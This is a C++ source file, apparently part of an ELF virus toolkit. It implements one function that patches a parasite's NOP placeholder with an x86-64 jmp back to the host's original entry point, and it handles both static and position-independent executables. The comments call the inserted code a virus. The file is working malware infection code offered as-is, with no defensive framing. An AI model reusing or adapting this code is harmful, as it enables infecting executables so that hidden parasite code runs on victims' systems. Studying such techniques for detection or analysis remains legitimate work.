#include "common/patch_pattern.hh"
#include "common/redirect_elf_entry_point.hh"

namespace vt::common {

bool redirect_elf_entry_point(
    Elf64_Half binary_type, Elf64_Addr original_entry_point,
    Elf64_Addr parasite_load_address, size_t parasite_offset,
    size_t parasite_size, vt::common::Mmap<PROT_READ | PROT_WRITE>& mapping) {
  constexpr auto no_op_to_be_patched = 0x9090909090909090;
  // For x86-64, patch the jmp address to the original entry point.
  // It is assumed that the inserted virus has at least 8 bytes of noop and
  // that's where it jumps back to host.
  // jmp rel32 e9 xxxxxxxx The rel32 offset is from the next instruction after
  // the jmp. The patched jump instruction is always 5 bytes.
  auto patch_offset_from_parasite_start = common::find<uint64_t>(
      mapping.base() + parasite_offset, parasite_size, no_op_to_be_patched);
  if (patch_offset_from_parasite_start == -1) {
    return false;
  }
  int32_t rel = 0;
  if (binary_type == ET_EXEC) {
    // for executables, the original entry is the load address, the parasite
    // load address is the new memory address. Use that for offset calculation.
    rel = original_entry_point -
          (parasite_load_address + patch_offset_from_parasite_start + 5);
  } else if (binary_type == ET_DYN) {
    // Both original and parasite offset are relative address to the process
    // start, which is not known until runtime.
    rel = original_entry_point -
          (parasite_offset + patch_offset_from_parasite_start + 5);
  } else {
    CHECK_FAIL();
  }

  constexpr uint64_t branch_op_code = 0xe9;
  void* patch_addr = mapping.mutable_base() + parasite_offset +
                     patch_offset_from_parasite_start;
  *static_cast<uint64_t*>(patch_addr) = branch_op_code;
  *(int32_t*)(mapping.mutable_base() + parasite_offset +
              patch_offset_from_parasite_start + 1) = rel;

  return true;
}

}  // namespace vt::common
